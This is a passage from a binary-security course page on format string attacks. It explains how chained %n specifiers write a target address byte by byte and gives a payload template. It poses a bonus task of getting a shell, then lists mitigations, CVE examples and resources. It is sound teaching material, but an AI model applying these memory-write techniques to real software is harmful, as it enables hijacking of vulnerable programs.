d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As <code>%n</code> writes how many characters have been printed until it is reached, each <code>%n</code> will print an incrementally larger value.
We use the 4 adjacent addresses to write byte by byte and use overflows to reach a lower value for the next byte.
For example, after writing <code>0xa6</code> we can write <code>0x0191</code>:</p><p><img loading="lazy" src="https://ocw.cs.pub.ro/courses/_media/cns/labs/bytes_write.png" alt="Write Bytes" class="img_ev3q"></p><p>Also, the <code>%n</code> count doesn&#x27;t reset so, if we want to write <code>0xa6</code> and then <code>0x91</code> the payload should be in the form of <code>&lt;0xa6 bytes&gt;%n&lt;0x100 - 0xa6 + 0x91 bytes&gt;%n</code>.</p><p>As mentioned earlier above, instead writing N bytes <code>“A” * N</code> you can use other format strings like <code>%Nc</code> or <code>%Nx</code> to keep the payload shorter.</p><p><strong>Bonus task</strong>: Can you get a shell?
(Assume <code>ASLR</code> is disabled).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="mitigation-and-recommendations">Mitigation and Recommendations<a class="hash-link" href="#mitigation-and-recommendations" title="Direct link to heading">​</a></h3><ol><li>Manage the string length carefully.</li><li>Don&#x27;t use <code>gets</code>.
With <code>gets</code> there is no way of knowing how much data was read</li><li>Use string functions with <code>n</code> parameter, whenever a non constant string is involved, i.e. <code>strnprintf</code>, <code>strncat</code>.</li><li>Make sure that the <code>NUL</code> byte is added, for instance <code>strncpy</code> does <strong>not</strong> add a <code>NUL</code> byte.</li><li>Use <code>wcstr*</code> functions when dealing with wide char strings.</li><li>Don&#x27;t trust the user!</li></ol><h3 class="anchor anchorWithStickyNavbar_LWe7" id="real-life-examples">Real life Examples<a class="hash-link" href="#real-life-examples" title="Direct link to heading">​</a></h3><ul><li><p><a href="http://xkcd.com/1354/" target="_blank" rel="noopener noreferrer"><code>Heartbleed</code></a>
Linux kernel through 3.9.4 <a href="http://www.cvedetails.com/cve/CVE-2013-2851/" target="_blank" rel="noopener noreferrer">CVE-2013-2851</a>
The fix is <a href="https://lore.kernel.org/all/1370649055-12830-2-git-send-email-keescook@chromium.org/" target="_blank" rel="noopener noreferrer">here</a>.
More details <a href="http://www.intelligentexploit.com/view-details-ascii.html?id=16609" target="_blank" rel="noopener noreferrer">here</a>.</p></li><li><p>Windows 7 <a href="http://www.cvedetails.com/cve/CVE-2012-1851/" target="_blank" rel="noopener noreferrer">CVE-2012-1851</a></p></li><li><p>Pidgin off the record plugin <a href="http://www.cvedetails.com/cve/CVE-2012-2369" target="_blank" rel="noopener noreferrer">CVE-2012-2369</a>.
The fix is <a href="https://bugzilla.novell.com/show_bug.cgi?id=762498#c1" target="_blank" rel="noopener noreferrer">here</a></p></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="resources">Resources<a class="hash-link" href="#resources" title="Direct link to heading">​</a></h2><ul><li><a href="http://www.cert.org/books/secure-coding/" target="_blank" rel="noopener noreferrer">Secure Coding in C and C++</a></li><li><a href="http://www.informit.com/articles/article.aspx?p=2036582" target="_blank" rel="noopener noreferrer">String representation in  C</a></li><li><a href="https://www.owasp.org/index.php/Improper_string_length_checking" target="_blank" rel="noopener noreferrer">Improper string length checking</a></li><li><a href="http://cwe.mitre.org/data/definitions/134.html" target="_blank" rel="noopener noreferrer">Format String definition</a></li><li><a href="https://www.owasp.org/index.php/Format_string_attack" target="_blank" rel="noopener noreferrer">Format String Attack (<code>OWASP</code>)</a></li><li><a href="http://projects.webappsec.org/w/page/13246926/Format%20String" target="_blank" rel="noopener noreferrer">Format String Attack (<code>webappsec</code>)</a></li><li><a href="http://www.gratisoft.us/todd/papers/strlcpy.html" target="_blank" rel="noopener noreferrer"><code>strlcpy</code> and <code>strlcat</code> - consistent, safe, string copy and  concatenation.</a>: This resource is useful to understand some of the string manipulation problems.</li></ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/binary-security/Mitigation and Defensive Strategies/Information Leaks/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Information Leaks</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/binary-security/Mitigation and Defensive Strategies/Bypassing Mitigations/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Bypassing Mitigations</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a><ul><li><a href="#objectives--rationale" class="table-of-contents__link toc-highlight">Objectives &amp; Rationale</a></li><li><a href="#what-is-a-string" class="table-of-contents__link toc-highlight">What is a String?</a></li><li><a href="#length-management" class="table-of-contents__link toc-highlight">Length Management</a></li></ul></li><li><a href="#1-basic-info-leak-tutorial" class="table-of-contents__link toc-highlight">1. Basic Info Leak (tutorial)</a></li><li><a href="#2-information-leak" class="table-of-contents__link toc-highlight">2. Information Leak</a><ul><li><a href="#exploiting-the-memory-write-using-the-info-leak" class="table-of-contents__link toc-highlight">Exploiting the Memory Write Using the Info Leak</a></li><li><a href="#format-string-attacks" class="table-of-contents__link toc-highlight">Format String Attacks</a></li></ul></li><li><a href="#example-2" class="table-of-contents__link toc-highlight">Example 2</a></li><li><a href="#example-3" class="table-of-contents__link toc-highlight">Example 3</a></li><li><a href="#basic-format-string-attack" class="table-of-contents__link toc-highlight">Basic Format String Attack</a></li><li><a href="#extra-format-string-attack" class="table-of-contents__link toc-highlight">Extra: Format String Attack</a><ul><li><a href="#transform-format-string-attack-to-a-memory-write" class="table-of-contents__link toc-highlight">Transform Format String Attack to a Memory Write</a></li><li><a href="#mitigation-and-recommendations" class="table-of-contents__link toc-highlight">Mitigation and Recommendations</a></li><li><a href="#real-life-examples" class="table-of-contents__link toc-highlight">Real life Examples</a></li></ul></li><li><a href="#resources" class="table-of-contents__link toc-highlight">Resources</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://security-summer-school.github.io/binary/" target="_blank" rel="noopener noreferrer" class="footer__link-item">site<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://www.facebook.com/SSSUPB/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Facebook<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 SSS Team</div></div></div></footer></div>
<script src="/binary-security/assets/js/runtime~main.74200969.js"></script>
<script src="/binary-security/assets/js/main.d9be8505.js"></script>
</body>
</html>